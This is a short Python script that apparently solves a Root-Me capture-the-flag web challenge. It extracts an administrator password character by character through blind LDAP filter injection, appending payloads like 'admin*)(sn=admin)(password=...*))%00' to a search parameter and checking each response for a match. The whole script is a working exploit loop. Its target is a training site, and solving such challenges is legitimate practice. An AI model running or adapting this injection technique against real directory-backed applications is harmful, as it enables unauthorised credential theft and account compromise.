import requests

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 '
passwd=''
t=0
for i in range(1,50):
	for c in chars:
		r = requests.get("http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin*)(sn=admin)(password=" + passwd + c + "*))%00")
		print "Password: " + passwd + c
		if c == ' ':
			t = 1
			break
		if "admin" in r.text:
			passwd = passwd + c
			break
	if t==1:
		break
